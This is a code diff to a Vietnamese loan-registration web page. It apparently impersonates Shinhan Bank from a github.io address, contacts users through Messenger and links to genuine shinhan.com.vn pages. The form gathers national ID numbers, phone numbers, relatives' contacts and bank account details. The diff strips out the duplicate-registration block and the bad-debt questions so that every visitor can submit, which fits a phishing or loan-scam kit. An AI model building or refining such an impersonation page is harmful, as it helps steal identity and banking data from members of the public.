@@ -25,9 +25,19 @@
             max-width: 100%;
             object-fit: contain;
         }
+        .navbar-nav {
+            display: flex;
+            flex-wrap: nowrap;
+            overflow-x: auto;
+            white-space: nowrap;
+            -webkit-overflow-scrolling: touch;
+        }
         .navbar-nav .nav-link {
             color: white !important;
             transition: color 0.3s;
+            padding: 8px 10px;
+            font-size: 0.9rem;
+            margin: 0 5px;
         }
         .navbar-nav .nav-link:hover {
             color: var(--accent-color) !important;
@@ -37,6 +47,10 @@
             justify-content: center;
             margin: 20px 0;
             position: relative;
+            flex-wrap: nowrap;
+            overflow-x: auto;
+            white-space: nowrap;
+            -webkit-overflow-scrolling: touch;
         }
         .step {
             padding: 10px 20px;
@@ -146,22 +160,31 @@
             margin-left: 5px;
             cursor: pointer;
         }
-        .block-message {
-            background: #fff3cd;
-            padding: 15px;
-            border-radius: 8px;
-            text-align: center;
-            margin: 20px 0;
-            color: #856404;
-        }
         @media (max-width: 768px) {
             .navbar-brand img {
                 height: 40px;
                 max-width: 100%;
                 object-fit: contain;
             }
+            .navbar-nav .nav-link {
+                font-size: 0.8rem;
+                padding: 6px 8px;
+                margin: 0 3px;
+            }
             .step-indicator {
-                display: none;
+                flex-direction: row;
+                flex-wrap: nowrap;
+                overflow-x: auto;
+                padding-bottom: 10px;
+            }
+            .step {
+                padding: 8px 15px;
+                margin: 0 8px;
+                font-size: 0.85rem;
+            }
+            .step-indicator::before {
+                left: 10%;
+                right: 10%;
             }
             .progress-percentage {
                 font-size: 0.9rem;
@@ -203,14 +226,14 @@
                 </button>
                 <div class="collapse navbar-collapse" id="navbarNav">
                     <ul class="navbar-nav ms-auto">
-                        <li class="nav-item"><a class="nav-link" href="#">GIỚI THIỆU</a></li>
-                        <li class="nav-item"><a class="nav-link" href="#">LỢI ÍCH</a></li>
-                        <li class="nav-item"><a class="nav-link" href="#">GIẤY TỜ CẦN THIẾT</a></li>
-                        <li class="nav-item"><a class="nav-link active" href="#">ĐĂNG KÝ TRỰC TUYẾN</a></li>
-                        <li class="nav-item"><a class="nav-link" href="#">XEM KẾT QUẢ</a></li>
-                        <li class="nav-item"><a class="nav-link" href="#">ĐIỀU KHOẢN SỬ DỤNG</a></li>
-                        <li class="nav-item"><a class="nav-link" href="#">LIÊN HỆ</a></li>
-                        <li class="nav-item"><a class="nav-link" href="#">MESSENGER</a></li>
+                        <li class="nav-item"><a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html">GIỚI THIỆU</a></li>
+                        <li class="nav-item"><a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/tham-chieu.html">LỢI ÍCH</a></li>
+                        <li class="nav-item"><a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/lai-suat-vay.html">GIẤY TỜ CẦN THIẾT</a></li>
+                        <li class="nav-item"><a class="nav-link active" href="https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html">ĐĂNG KÝ TRỰC TUYẾN</a></li>
+                        <li class="nav-item"><a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/lai-suat-tien-gui.html">XEM KẾT QUẢ</a></li>
+                        <li class="nav-item"><a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">ĐIỀU KHOẢN SỬ DỤNG</a></li>
+                        <li class="nav-item"><a class="nav-link" href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">LIÊN HỆ</a></li>
+                        <li class="nav-item"><a class="nav-link" href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">MESSENGER</a></li>
                     </ul>
                 </div>
             </div>
@@ -223,10 +246,6 @@
             <div class="step active">1. Nhập thông tin</div>
             <div class="step">2. Xác thực và xử lý</div>
             <div class="step">3. Hoàn thành</div>
-        </div>
-
-        <div id="blockMessage" class="block-message" style="display: none;">
-            <p><strong>Thông báo:</strong> Đã có hồ sơ đăng ký tại Ngân hàng Shinhan. Vui lòng liên hệ hỗ trợ để biết thêm chi tiết.</p>
         </div>
 
         <div id="registrationContent">
@@ -455,26 +474,6 @@
                                         <p id="relationshipError" class="error"></p>
                                     </div>
                                 </div>
-                                <div class="row">
-                                    <div class="col-md-6 mb-3">
-                                        <label for="hasBadDebt" class="form-label">Nợ xấu *</label>
-                                        <select class="form-select" id="hasBadDebt" name="hasBadDebt" required>
-                                            <option value="">Chọn</option>
-                                            <option value="Có">Có</option>
-                                            <option value="Không">Không</option>
-                                        </select>
-                                        <p id="hasBadDebtError" class="error"></p>
-                                    </div>
-                                    <div class="col-md-6 mb-3">
-                                        <label for="hasHighDebt" class="form-label">Nợ chú ý *</label>
-                                        <select class="form-select" id="hasHighDebt" name="hasHighDebt" required>
-                                            <option value="">Chọn</option>
-                                            <option value="Có">Có</option>
-                                            <option value="Không">Không</option>
-                                        </select>
-                                        <p id="hasHighDebtError" class="error"></p>
-                                    </div>
-                                </div>
                             </div>
                         </div>
                     </div>
@@ -566,15 +565,14 @@
                 <div class="form-check mb-3">
                     <input class="form-check-input" type="checkbox" id="privacyConsent" name="privacyConsent" required>
                     <label class="form-check-label" for="privacyConsent">
-                        Tôi đồng ý với <a href="#" target="_blank">Chính sách bảo mật</a> và <a href="#" target="_blank">Điều khoản sử dụng</a>.
+                        Tôi đồng ý với <a href="https://shinhan.com.vn/vi/page/chinh-sach-bao-mat.html" target="_blank">Chính sách bảo mật</a> và <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html" target="_blank">Điều khoản sử dụng</a>.
                     </label>
                     <p id="privacyConsentError" class="error"></p>
                 </div>
 
                 <div class="d-flex justify-content-between mt-3 flex-column flex-md-row">
                     <div class="mb-2 mb-md-0">
-                        <a href="#" class="btn btn-outline-secondary">TRANG CHỦ</a>
-                        <button type="button" class="btn btn-outline-danger ms-2" onclick="resetProgress()">XÓA TIẾN TRÌNH</button>
+                        <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/trang-chu.html" class="btn btn-outline-secondary">TRANG CHỦ</a>
                     </div>
                     <div>
                         <button type="button" class="btn btn-primary position-relative" onclick="calculateLoan()">
@@ -594,12 +592,17 @@
     <footer class="bg-light py-3 mt-4">
         <div class="container text-center">
             <div class="footer-links">
-                <a href="#">Chính sách bảo mật</a> |
-                <a href="#">Điều khoản sử dụng</a> |
+                <a href="https://shinhan.com.vn/vi/page/chinh-sach-bao-mat.html">Chính sách bảo mật</a> |
+                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Điều khoản sử dụng</a> |
                 <a href="#">Chính sách Cookies</a> |
-                <a href="#">Miễn khoản từ chối liên kết bên ngoài</a> |
+                <a href="https://shinhan.com.vn/vi/page/chinh-sach-lien-ket.html">Miễn khoản từ chối liên kết bên ngoài</a> |
                 <a href="#">Hướng dẫn truy cập web</a> |
-                <a href="#">Sitemap</a>
+                <a href="https://shinhan.com.vn/vi/page/sitemap-2.html">Sitemap</a> |
+                <a href="#">Trung tâm bảo mật</a> |
+                <a href="https://online.shinhan.com.vn/global.shinhan">Demo Ngân hàng trực tuyến</a> |
+                <a href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">Liên hệ</a> |
+                <a href="#">Trang Global Portal</a> |
+                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html">Giới Thiệu</a>
             </div>
             <p class="mt-2">
                 Trung tâm bảo mật | Demo Ngân hàng trực tuyến | Liên hệ | Trang Global Portal | Giới Thiệu
@@ -662,15 +665,9 @@
             this.value = parseFloat(this.value).toFixed(2);
         });
 
-        // Check for existing registration
+        // Load user data on page load
         window.onload = function() {
             loadUserData();
-            if (localStorage.getItem('registered')) {
-                document.getElementById('blockMessage').style.display = 'block';
-                document.getElementById('registrationContent').style.display = 'none';
-                console.log('Existing registration detected');
-                return;
-            }
             // Ensure interest rate is set after loading user data
             updateInterestRate();
         };
@@ -716,38 +713,31 @@
                 if (storedData) {
                     userData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
                     console.log('Loaded userData from localStorage:', userData);
-                    if (userData.isRegistered && userData.cccd && registeredUsers.includes(userData.cccd)) {
-                        document.getElementById('blockMessage').style.display = 'block';
-                        document.getElementById('registrationContent').style.display = 'none';
-                    } else {
-                        document.getElementById('fullName').value = userData.fullName || '';
-                        document.getElementById('dob').value = userData.dob || '';
-                        document.getElementById('gender').value = userData.gender || '';
-                        document.getElementById('contactAddress').value = userData.contactAddress || '';
-                        document.getElementById('hometown').value = userData.hometown || '';
-                        document.getElementById('nationality').value = userData.nationality || 'Việt Nam';
-                        document.getElementById('cccd').value = userData.cccd || '';
-                        document.getElementById('idIssueDate').value = userData.idIssueDate || '';
-                        document.getElementById('issuePlace').value = userData.issuePlace || '';
-                        document.getElementById('phone').value = userData.phone || '';
-                        document.getElementById('email').value = userData.email || '';
-                        document.getElementById('loanType').value = userData.loanType || '';
-                        document.getElementById('loanTerm').value = userData.loanTerm || '';
-                        document.getElementById('loanAmount').value = userData.loanAmount || '';
-                        document.getElementById('disbursementDate').value = userData.disbursementDate || getCurrentDate();
-                        document.getElementById('interestRate').value = userData.interestRate || '7.00';
-                        document.getElementById('monthlyIncome').value = userData.monthlyIncome || '';
-                        document.getElementById('occupation').value = userData.occupation || '';
-                        document.getElementById('loanPurpose').value = userData.loanPurpose || '';
-                        document.getElementById('relativePhone').value = userData.relativePhone || '';
-                        document.getElementById('relationship').value = userData.relationship || '';
-                        document.getElementById('hasBadDebt').value = userData.hasBadDebt || '';
-                        document.getElementById('hasHighDebt').value = userData.hasHighDebt || '';
-                        document.getElementById('accountName').value = userData.accountName || '';
-                        document.getElementById('accountNumber').value = userData.accountNumber || '';
-                        document.getElementById('bankName').value = userData.bankName || '';
-                        updateInterestRate(); // Ensure interest rate is updated after loading
-                    }
+                    document.getElementById('fullName').value = userData.fullName || '';
+                    document.getElementById('dob').value = userData.dob || '';
+                    document.getElementById('gender').value = userData.gender || '';
+                    document.getElementById('contactAddress').value = userData.contactAddress || '';
+                    document.getElementById('hometown').value = userData.hometown || '';
+                    document.getElementById('nationality').value = userData.nationality || 'Việt Nam';
+                    document.getElementById('cccd').value = userData.cccd || '';
+                    document.getElementById('idIssueDate').value = userData.idIssueDate || '';
+                    document.getElementById('issuePlace').value = userData.issuePlace || '';
+                    document.getElementById('phone').value = userData.phone || '';
+                    document.getElementById('email').value = userData.email || '';
+                    document.getElementById('loanType').value = userData.loanType || '';
+                    document.getElementById('loanTerm').value = userData.loanTerm || '';
+                    document.getElementById('loanAmount').value = userData.loanAmount || '';
+                    document.getElementById('disbursementDate').value = userData.disbursementDate || getCurrentDate();
+                    document.getElementById('interestRate').value = userData.interestRate || '7.00';
+                    document.getElementById('monthlyIncome').value = userData.monthlyIncome || '';
+                    document.getElementById('occupation').value = userData.occupation || '';
+                    document.getElementById('loanPurpose').value = userData.loanPurpose || '';
+                    document.getElementById('relativePhone').value = userData.relativePhone || '';
+                    document.getElementById('relationship').value = userData.relationship || '';
+                    document.getElementById('accountName').value = userData.accountName || '';
+                    document.getElementById('accountNumber').value = userData.accountNumber || '';
+                    document.getElementById('bankName').value = userData.bankName || '';
+                    updateInterestRate(); // Ensure interest rate is updated after loading
                 } else {
                     // If no userData, set default interest rate
                     updateInterestRate();
@@ -784,8 +774,6 @@
                 { id: 'loanPurpose', errorId: 'loanPurposeError', validate: value => value !== '', message: 'Vui lòng chọn mục đích vay.' },
                 { id: 'relativePhone', errorId: 'relativePhoneError', validate: value => /^\d{10}$/.test(value.replace(/\s/g, '')), message: 'Số điện thoại người thân phải đúng 10 chữ số.' },
                 { id: 'relationship', errorId: 'relationshipError', validate: value => value !== '', message: 'Vui lòng chọn quan hệ.' },
-                { id: 'hasBadDebt', errorId: 'hasBadDebtError', validate: value => value !== '', message: 'Vui lòng chọn tình trạng nợ xấu.' },
-                { id: 'hasHighDebt', errorId: 'hasHighDebtError', validate: value => value !== '', message: 'Vui lòng chọn tình trạng nợ chú ý.' },
                 { id: 'accountName', errorId: 'accountNameError', validate: value => value.trim().length > 2, message: 'Tên chủ tài khoản phải trên 2 ký tự.' },
                 { id: 'accountNumber', errorId: 'accountNumberError', validate: value => /^\d{10,20}$/.test(value.replace(/\s/g, '')), message: 'Số tài khoản phải từ 10 đến 20 chữ số.' },
                 { id: 'bankName', errorId: 'bankNameError', validate: value => value !== '', message: 'Vui lòng chọn ngân hàng.' },
@@ -895,8 +883,6 @@
                 loanPurpose: document.getElementById('loanPurpose').value || 'N/A',
                 relativePhone: document.getElementById('relativePhone').value.trim() || 'N/A',
                 relationship: document.getElementById('relationship').value || 'N/A',
-                hasBadDebt: document.getElementById('hasBadDebt').value || 'N/A',
-                hasHighDebt: document.getElementById('hasHighDebt').value || 'N/A',
                 accountName: document.getElementById('accountName').value.trim() || 'N/A',
                 accountNumber: document.getElementById('accountNumber').value.trim() || 'N/A',
                 bankName: document.getElementById('bankName').value || 'N/A',
@@ -942,8 +928,6 @@
                 loanPurpose: document.getElementById('loanPurpose').value || 'N/A',
                 relativePhone: document.getElementById('relativePhone').value.trim() || 'N/A',
                 relationship: document.getElementById('relationship').value || 'N/A',
-                hasBadDebt: document.getElementById('hasBadDebt').value || 'N/A',
-                hasHighDebt: document.getElementById('hasHighDebt').value || 'N/A',
                 accountName: document.getElementById('accountName').value.trim() || 'N/A',
                 accountNumber: document.getElementById('accountNumber').value.trim() || 'N/A',
                 bankName: document.getElementById('bankName').value || 'N/A',
@@ -984,8 +968,6 @@
                         loan_purpose: userData.loanPurpose,
                         company_phone: userData.relativePhone,
                         company_address: userData.relationship,
-                        has_bad_debt: userData.hasBadDebt,
-                        has_high_debt: userData.hasHighDebt,
                         account_holder_name: userData.accountName,
                         account_number: userData.accountNumber.replace(/\s/g, ''),
                         bank_name: userData.bankName,
@@ -1024,15 +1006,6 @@
                 spinner.style.display = 'none';
                 alert('Lỗi lưu dữ liệu.');
                 console.error('LocalStorage save failed');
-            }
-        }
-
-        function resetProgress() {
-            if (confirm('Bạn có chắc chắn muốn xóa toàn bộ tiến trình?')) {
-                localStorage.removeItem('userData');
-                localStorage.removeItem('registeredUsers');
-                localStorage.removeItem('registered');
-                window.location.reload();
             }
         }
 
